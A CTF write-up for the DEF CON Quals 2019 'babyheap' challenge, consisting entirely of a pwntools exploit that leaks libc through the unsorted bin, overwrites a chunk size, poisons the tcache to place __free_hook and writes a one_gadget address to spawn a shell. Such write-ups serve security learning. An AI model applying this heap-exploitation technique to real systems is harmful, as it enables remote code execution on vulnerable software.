# **babyheap**

#### tag : pwnable, tcache, libc-2.29

-----------------------------------------------

#### Description

-----------------------------------------------

#### Solution

```python
from pwn import *

context.log_level = 'debug'
r = remote('babyheap.quals2019.oooverflow.io', 5000)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))
s0 = lambda x: r.send(str(x))
go = lambda x: (rr('> '), s0(x))

__malloc_hook_offset = 0x1E4C30
__free_hook_offset = 0x1E75A8
libc_main_arena_offset = 0x1E4C40
libc_one_gadget_offset = [0xe237f,0xe2383,0xe2386,0x106ef8][3]

def malloc(s,c):
    go('M')
    rr('> ')
    ss(s)
    rr('> ')
    ss(c)

def free(i):
    go('F')
    rr('> ')
    ss(i)

def show(i):
    go('S')
    rr('> ')
    ss(i)
    return rr('\n')

# allocate chunks bigger than tcache's max
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')

# free chunks(8...2 -> tcache bin [0x100])
# free chunks(1...0 -> unsorted bin)
free(8)
free(7)
free(6)
free(5)
free(4)
free(3)
free(2)
free(1)
free(0)

# allocate chunks
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')
malloc(1, '')

# leak main_arena by unsorted bin(main_arena+592)
main_arena =  u64((show(7)[:-1]).ljust(8, '\x00')) - 592

# set libc base address and free_hook's address
# malloc_hook dosen't work in this problem so I use free_hook
libc_base = main_arena - libc_main_arena_offset
malloc_hook = libc_base + __malloc_hook_offset
free_hook = libc_base + __free_hook_offset
libc_one_gadget = libc_base + libc_one_gadget_offset

log.info('main arena: 0x%x' % main_arena)
log.info('libc base: 0x%x' % libc_base)

# overwrite size of chunk : 0x100 -> 0x180
free(0)
malloc(248, 'a'*248+'\x80')

# chunk go to tcache bin [0x180], and tcache poisoning with fake fd(&free_hook)
free(1)
free(2)
malloc(376, 'b'*256 + (p64(free_hook)).replace('\x00', ''))

# allocate chunk at free_hook and write one_gadget address to free_hook
malloc(100, 'A'*100)
malloc(100, (p64(libc_one_gadget)).replace('\x00', ''))

# trigger free_hook which is refer to one_gadget
free(5)

r.interactive()
```
